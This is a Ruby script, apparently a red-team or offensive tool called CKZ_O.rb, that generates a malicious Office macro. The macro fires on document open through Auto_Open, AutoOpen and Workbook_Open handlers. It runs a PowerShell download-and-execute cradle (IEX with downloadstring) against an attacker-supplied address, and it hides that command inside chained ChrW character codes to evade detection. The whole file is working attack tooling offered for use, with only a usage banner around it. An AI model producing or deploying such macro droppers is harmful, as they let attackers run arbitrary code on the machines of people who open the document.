#!/usr/bin/env ruby

require "ipaddress"
# payload obfuscation
def obpayload(payload)
    output = "Dim next1 As String\nnext1 = "
    onlinecount = 0
    linecount = 0
    linenumb = 1
    onlinecount = 0
    payloadindex = 0
  
    payload.each_byte do |c|
      if onlinecount < 10
        output +=  if onlinecount == 0
                      "ChrW(#{c}) "
                    else
                      "& ChrW(#{c}) "
                    end
        onlinecount += 1
        payloadindex += 1
      else
        linenumb += 1
        output += "\nDim next#{linenumb} As String\nnext#{linenumb} = ChrW(#{c}) "
        onlinecount = 1
        linecount += 1
        payloadindex += 1
      end
    end
  
    output += "\n\npayload = next1 "
      for x in 2..linenumb
        output += "+ next#{x} "
      end
    
    return output
  end
  
  protocol = ARGV[0]
  ipadd = ARGV[1]
  filename = ARGV[2]
  
  if (ARGV[0] == nil)
      puts "
       ____ _  __ _____     ___
      / ___| |/ /|__  /    / _ \\
     | |   | ' /   / /    | | | |
     | |___| . \\  / /_    | |_| |
      \\____|_|\\_\\/____|____\\___/
      Created by CausticKirbyZ
      
      Documentation:
      This script will generate a office macro that will download the contents of a text file at the given address and run it with powershell.
      
      Syntax:
      ./CKZ_O.rb <Protocol> <ip address[:portnumber]> <file name>
  
      if no port number if specified it will use the default for the given protocol.

      Example:
      ./CKZ_O.rb http 192.168.1.1 myfile.txt
      ./CKZ_O.rb http 192.168.1.1:1234 myfile.txt
      "
      abort
    end
    
  if (ARGV[0] !~ /https?/i)
    puts ARGV[0]
    puts "SYNTAX ERROR
    please Enter Valid Protocol : 
    http, https, smb, etc...
    CKZ_O.rb <Protocol> <ip address[:portnumber]> <file name>
    "
    abort
  end

  if (ARGV[1] == nil || (IPAddress.valid? ARGV[1].split(":")[0]) == false)
    puts "SYNTAX ERROR
    Please Enter a valid IP address
    CKZ_O.rb <protocol> <ip address[:portnumber]> <file name>
    "
    abort
  end
  
  if(ARGV[2] == nil  )
    puts "SYNTAX ERROR
    Please Enter a file name
    CKZ_O.rb <protocol> <ip address[:portnumber]> <file name>
    "
    abort
  end    
  
  
  
  payload = "Sub Auto_Open()\n\nDim payload As String\n"
  
  unobpayload = "powershell.exe \"IEX ((new-object net.webclient).downloadstring('#{protocol}://#{ipadd}/#{filename}'))\""
  
  payload += "#{obpayload(unobpayload)}\n\n"
  
  payload += "Shell (payload)
  End sub
  
  Sub AutoOpen()
  Auto_Open
  End Sub
  Sub Workbook_Open()
  Auto_Open
  End Sub"
  
  puts payload
